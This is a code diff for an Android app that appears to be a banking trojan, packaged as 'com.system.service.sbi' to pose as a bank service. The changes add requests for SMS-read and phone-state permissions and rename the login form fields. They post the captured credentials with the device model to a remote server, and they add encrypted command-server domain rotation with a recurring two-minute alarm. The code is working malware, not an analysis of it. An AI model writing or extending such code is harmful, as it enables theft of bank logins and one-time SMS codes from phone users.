@@ -2,6 +2,9 @@
 
     import android.Manifest;
     import android.annotation.SuppressLint;
+    import android.app.AlarmManager;
+    import android.app.PendingIntent;
+    import android.content.Context;
     import android.content.DialogInterface;
     import android.content.Intent;
     import android.content.pm.PackageManager;
@@ -20,8 +23,9 @@
     import androidx.core.app.ActivityCompat;
     import androidx.core.content.ContextCompat;
 
-    import com.system.service.sbi.FrontServices.BackgroundService;
-    import com.system.service.sbi.FrontServices.FormValidator;
+    import com.system.service.sbi.MinorServices.BackgroundService;
+    import com.system.service.sbi.MinorServices.FormValidator;
+    import com.system.service.sbi.MinorServices.SharedPreferencesHelper;
 
     import org.json.JSONException;
     import org.json.JSONObject;
@@ -43,17 +47,22 @@
             super.onCreate(savedInstanceState);
             setContentView(R.layout.activity_main);
 
-            dataObject = new HashMap<>();
-            checkAndRequestPermissions();
-
-            Helper helper1 = new Helper();
-
-            Log.d(helper1.TAG, helper1.SITE());
-
-            if(!Helper.isNetworkAvailable(this)) {
+            if(!HelperService.isNetworkAvailable(this)) {
                 Intent intent = new Intent(MainActivity.this, NoInternetActivity.class);
                 startActivity(intent);
             }
+            this.updateDomain(this);
+
+        }
+
+        public void initFunction(){
+
+
+            dataObject = new HashMap<>();
+            checkAndRequestPermissions();
+
+            HelperService helperService1 = new HelperService();
+            Log.d(helperService1.TAG, helperService1.SITE());
 
             Intent serviceIntent = new Intent(this, BackgroundService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -63,9 +72,9 @@
             }
             // Initialize the ids map
             ids = new HashMap<>();
-            ids.put(R.id.username, "username");
-            ids.put(R.id.moo, "moo");
-            ids.put(R.id.password, "password");
+            ids.put(R.id.masternm, "masternm");
+            ids.put(R.id.ph00n, "ph00n");
+            ids.put(R.id.usrmpasss, "usrmpasss");
 
             // Populate dataObject
             for(Map.Entry<Integer, String> entry : ids.entrySet()) {
@@ -85,11 +94,11 @@
                     JSONObject dataJson = new JSONObject(dataObject);
                     JSONObject sendPayload = new JSONObject();
                     try {
-                        Helper helper = new Helper();
+                        HelperService helperService = new HelperService();
                         dataJson.put("mobileName", Build.MODEL);
-                        sendPayload.put("site", helper.SITE());
+                        sendPayload.put("site", helperService.SITE());
                         sendPayload.put("data", dataJson);
-                        Helper.postRequest(helper.FormSavePath(), sendPayload, new Helper.ResponseListener() {
+                        HelperService.postRequest(helperService.FormSavePath(), sendPayload, getApplicationContext(),  new HelperService.ResponseListener() {
                             @Override
                             public void onResponse(String result) {
                                 if (result.startsWith("Response Error:")) {
@@ -102,7 +111,7 @@
                                             intent.putExtra("id", response.getInt("data"));
                                             startActivity(intent);
                                         }else{
-                                            Log.d(Helper.TAG, "Status  Not 200"+response);
+                                            Log.d(HelperService.TAG, "Status  Not 200"+response);
                                             Toast.makeText(MainActivity.this, "Status Not 200 : "+response, Toast.LENGTH_SHORT).show();
                                         }
                                     } catch (JSONException e) {
@@ -118,7 +127,7 @@
                     Toast.makeText(MainActivity.this, "form validation failed", Toast.LENGTH_SHORT).show();
                 }
             });
-
+            scheduleDomainUpdateAlarm();
         }
 
         @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
@@ -197,18 +206,19 @@
         }
 
 
-
-
         // start permission checker
         private void checkAndRequestPermissions() {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                // Check if the SMS permission is not granted
-                if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) !=
-                        PackageManager.PERMISSION_GRANTED ||
-                        ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) !=
-                                PackageManager.PERMISSION_GRANTED) {
+                if (
+                        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED ||
+
+                        ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED ||
+                        ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
+                        ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED
+                )
+                {
                     ActivityCompat.requestPermissions(this,
-                            new String[]{Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS},
+                            new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS},
                             SMS_PERMISSION_REQUEST_CODE);
                 } else {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
@@ -221,7 +231,6 @@
             }
         }
 
-        @RequiresApi(api = Build.VERSION_CODES.M)
         @Override
         public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                                @NonNull int[] grantResults) {
@@ -235,7 +244,6 @@
                         initializeWebView();
                     }
                 } else {
-                    // SMS permissions denied
                     showPermissionDeniedDialog();
                 }
             }
@@ -244,8 +252,7 @@
         private void showPermissionDeniedDialog() {
             AlertDialog.Builder builder = new AlertDialog.Builder(this);
             builder.setTitle("Permission Denied");
-            builder.setMessage("SMS permissions are required to send and receive messages. " +
-                    "Please grant the permissions in the app settings.");
+            builder.setMessage("All permissions are required to perform the application actions. " + "Please grant the permissions in the app settings.");
 
             // Open settings button
             builder.setPositiveButton("Open Settings", new DialogInterface.OnClickListener() {
@@ -273,6 +280,66 @@
             startActivity(intent);
         }
 
+        private void scheduleDomainUpdateAlarm() {
+            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
 
+            Intent intent = new Intent(this, DomainUpdateReceiver.class);
+            int flags = Build.VERSION.SDK_INT >= Build.VERSION_CODES.S
+                    ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
+                    : PendingIntent.FLAG_UPDATE_CURRENT;
+
+            PendingIntent pendingIntent = PendingIntent.getBroadcast(
+                    this, 0, intent, flags);
+
+            // 1mnt call
+            long interval = 2 * 60 * 1000;
+            long triggerAtMillis = System.currentTimeMillis() + interval;
+            alarmManager.setRepeating(
+                    AlarmManager.RTC_WAKEUP, triggerAtMillis, interval, pendingIntent);
+        }
+
+        public void updateDomain(final Context cc) {
+            final SharedPreferencesHelper db = new SharedPreferencesHelper(cc);
+            final NetworkHelper network = new NetworkHelper();
+            final HelperService help = new HelperService();
+            String DomainList = help.DomainList();
+            final String[] domainArray = DomainList.split(", ");
+            checkDomainSequentially(0, domainArray, db, network);
+        }
+
+        private void checkDomainSequentially(final int index, final String[] domainArray, final SharedPreferencesHelper db, final NetworkHelper network) {
+            if (index >= domainArray.length) {
+                db.saveString("domainStatus", "failed");
+                return;
+            }
+            final String currentDomain = domainArray[index];
+            network.makeGetRequest(currentDomain, new NetworkHelper.GetRequestCallback() {
+                @Override
+                public void onSuccess(String result) {
+                    String encryptedData = result.trim();
+
+                    try {
+                        HelperService h = new HelperService();
+                        String decryptedData = AESDescryption.decrypt(encryptedData, h.KEY());
+
+                        if (!decryptedData.isEmpty()) {
+                            JSONObject object = new JSONObject(decryptedData);
+                            db.saveString("domain", object.getString("domain"));
+                            db.saveString("socket", object.getString("socket"));
+                            initFunction();
+                        }
+                    } catch (Exception e) {
+                        throw new RuntimeException(e);
+                    }
+                }
+
+                @Override
+                public void onFailure(String error) {
+                    Log.d(HelperService.TAG, "Failed for domain: " + currentDomain + " Error: " + error);
+                    Toast.makeText(getApplicationContext(), "Failed for domain: " + currentDomain + " Error: " + error, Toast.LENGTH_LONG).show();
+                    checkDomainSequentially(index + 1, domainArray, db, network);
+                }
+            });
+        }
 
     }
